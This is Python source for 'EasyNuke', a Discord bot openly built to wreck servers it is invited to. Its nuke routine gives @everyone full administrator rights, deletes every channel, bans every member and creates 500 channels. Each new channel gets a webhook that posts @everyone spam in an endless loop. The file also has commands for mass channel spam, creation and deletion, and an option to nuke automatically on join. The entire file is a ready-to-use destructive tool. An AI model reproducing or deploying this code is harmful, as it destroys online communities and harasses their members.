#BOT CONFIG
token = ""
prefix = ""

#NUKE CONFIG
spam_messages = ["@everyone nuked", "@everyone get nuked"]
channel_names = ["nuked", "get nuked"]
webhook_usernames = ["nuked", "get nuked"]
nuke_on_join = False
nuke_wait_time = 0



###############################################################################################################################
# WAIT!!! DON'T TOUCH ANYTHING BELOW UNLESS YOU KNOW EXACTLY WHAT YOU ARE DOING!!! THIS MAY CAUSE SOME ISSUES WITH THE BOT!!! #
###############################################################################################################################


import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S

bot = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())

@bot.event
async def on_ready():
  print(f"""
{S.BRIGHT}{C.LIGHTGREEN_EX}Easynuke is ready.{S.NORMAL}
This script is connected to {C.WHITE}{bot.user}.
{C.GREEN}Run {C.WHITE}{prefix}kill {C.GREEN}in any server to nuke it.
{C.GREEN}Run {C.WHITE}{prefix}cmds {C.GREEN}in any server with your bot to get a list of commands.

{C.WHITE}Your bot's oauth2 link is {C.LIGHTBLUE_EX}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot
""")
  
bot.remove_command("help")

@bot.command()
async def cmds(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "EasyNuke - Commands", 
    description = """
**__COMMANDS__**
```
{prefix}cmds
Shows this message. 
 
{prefix}kill
Nukes the server. 
 
{prefix}sall <message>
Spams all the channels.
 
{prefix}ccr <channel count> <channel name>
Creates channels with the given name.
 
{prefix}cdel
Deletes all channels.
 
{prefix}logout
Logs out the client.
```
**__CREDITS__**
```
Made by Chaotic.
https://github.com/Chatic-Gaming/DiscordNukebot
```
""")
  await author.send(embed = cmds)


async def nuke(guild):
  print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
    except:
      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Nuked {guild.name}.")
  
@bot.command()
async def kill(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
  
@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return
  
@bot.command()
async def sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass

@bot.command()
async def ccr(ctx, amount = 10, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
        return
      except:
        pass

@bot.command()
async def cdel(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")

@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "nuked")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))

@bot.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

if __name__ == "__main__":
  print(f"""
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}   ▄████████    ▄████████    ▄████████ ▄██   ▄   ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███   ███    ███ ███   ██▄ ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▀    ███    ███   ███    █▀  ███▄▄▄███ ███   ███ ███    ███   ███▐██▀     ███    █▀  {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT} ▄███▄▄▄       ███    ███   ███        ▀▀▀▀▀▀███ ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}▀▀███▀▀▀     ▀███████████ ▀███████████ ▄██   ███ ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▄    ███    ███          ███ ███   ███ ███   ███ ███    ███   ███▐██▄     ███    █▄  {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███    ▄█    ███ ███   ███ ███   ███ ███    ███   ███ ▀███▄   ███    ███ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ██████████   ███    █▀   ▄████████▀   ▀█████▀   ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ {S.RESET_ALL}||

{S.RESET_ALL}                                       {C.BLACK}-Made by Chaotic-
                       {C.WHITE}https://github.com/Chatic-Gaming/DiscordNukebot
  """)
  try:
    bot.run(token)
  except discord.LoginFailure:
    print(f"{C.RED}Client failed to log in. {C.WHITE}[Improper Token Passed]")
  except discord.HTTPException:
    print(f"{C.RED}Client failed to log in. {C.WHITE}[Unknown Error]")
